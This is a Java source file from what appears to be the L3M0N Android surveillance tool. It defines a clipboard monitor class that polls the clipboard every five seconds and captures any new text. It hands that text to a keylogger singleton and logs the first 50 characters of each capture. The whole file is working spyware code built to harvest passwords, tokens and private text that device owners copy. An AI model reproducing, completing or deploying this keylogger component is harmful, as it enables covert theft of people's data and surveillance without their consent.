package com.etechd.l3mon.keylogger;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.etechd.l3mon.L3MONKeyLogger;

/**
 * Clipboard Monitor for L3M0N KeyLogger
 * Periodically checks the clipboard for new data
 */
public class ClipboardMonitor {

    private static final String TAG = "L3M0N_ClipboardMonitor";
    private static final int CHECK_INTERVAL = 5000; // 5 seconds

    private final Context context;
    private final ClipboardManager clipboardManager;
    private final Handler handler;

    private boolean enabled = false;
    private String lastClipboardContent = "";
    private Runnable checkRunnable;

    public ClipboardMonitor(Context context) {
        this.context = context;
        this.clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        this.handler = new Handler(Looper.getMainLooper());
    }

    public void enable() {
        if (!enabled) {
            enabled = true;
            startPeriodicCheck();
            Log.d(TAG, "Clipboard monitoring enabled");
        }
    }

    public void disable() {
        if (enabled) {
            enabled = false;
            stopPeriodicCheck();
            Log.d(TAG, "Clipboard monitoring disabled");
        }
    }

    public boolean isEnabled() {
        return enabled;
    }

    private void startPeriodicCheck() {
        if (checkRunnable == null) {
            checkRunnable = new Runnable() {
                @Override
                public void run() {
                    if (enabled) {
                        checkClipboard();
                        handler.postDelayed(this, CHECK_INTERVAL);
                    }
                }
            };
            handler.post(checkRunnable);
        }
    }

    private void stopPeriodicCheck() {
        if (checkRunnable != null) {
            handler.removeCallbacks(checkRunnable);
            checkRunnable = null;
        }
    }

    private void checkClipboard() {
        if (clipboardManager == null || !clipboardManager.hasPrimaryClip()) {
            return;
        }

        try {
            ClipData clipData = clipboardManager.getPrimaryClip();
            if (clipData != null && clipData.getItemCount() > 0) {
                ClipData.Item item = clipData.getItemAt(0);
                CharSequence text = item.getText();

                if (text != null) {
                    String currentContent = text.toString();

                    // Only process if content changed and is not empty
                    if (!currentContent.isEmpty() && !currentContent.equals(lastClipboardContent)) {
                        lastClipboardContent = currentContent;

                        // Send to KeyLogger
                        L3MONKeyLogger keyLogger = L3MONKeyLogger.getInstance();
                        if (keyLogger != null) {
                            keyLogger.onClipboardChanged(currentContent);
                        }

                        Log.d(TAG, "Clipboard content captured: " + currentContent.substring(0, Math.min(50, currentContent.length())));
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading clipboard", e);
        }
    }
}
